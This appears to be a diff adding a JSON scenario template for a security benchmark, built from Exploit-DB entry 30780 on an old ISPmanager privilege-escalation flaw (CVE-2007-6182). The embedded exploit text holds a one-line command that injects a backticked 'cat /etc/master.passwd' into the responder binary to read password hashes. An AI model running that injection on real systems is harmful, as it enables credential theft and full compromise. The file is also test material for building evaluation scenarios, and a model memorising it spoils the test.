@@ -1,0 +1,30 @@
+{
+  "template_id": "auto_edb_30780",
+  "category": "D1_credential",
+  "attack_technique": "T1552.001",
+  "cwe": "CWE-256",
+  "description": "Linux privilege escalation: ISPmanager 4.2.15 - Responder Privilege Escalation (CVE-2007-6182;OSVDB-42337)\n\nExploit source code (30780.txt):\n```\nsource: https://www.securityfocus.com/bid/26503/info\n\nISPmanager is prone to a local privilege-escalation vulnerability.\n\nA local attacker can exploit this issue to gain elevated privileges on the affected computer. A successful exploit will lead to the complete compromise of the affected computer.\n\nISPmanager 4.2.15.1 is reported vulnerable; other versions may be affected as well.\n\n/usr/local/ispmgr/sbin/responder /tmp/ '` cat /etc/master.passwd1>&2 `' 2>&1\n```",
+  "cve": "CVE-2007-6182;OSVDB-42337",
+  "exploitdb_id": "30780",
+  "feasibility": "L1",
+  "docker_run_args": [],
+  "detection_difficulty": "medium",
+  "interaction_mode": "multi_step",
+  "params": {
+    "username": {
+      "type": "string",
+      "default": "lowpriv"
+    },
+    "password": {
+      "type": "string",
+      "default": "password123"
+    }
+  },
+  "instances": [
+    {
+      "scenario_id": "edb_30780",
+      "type": "core",
+      "difficulty": "easy"
+    }
+  ]
+}
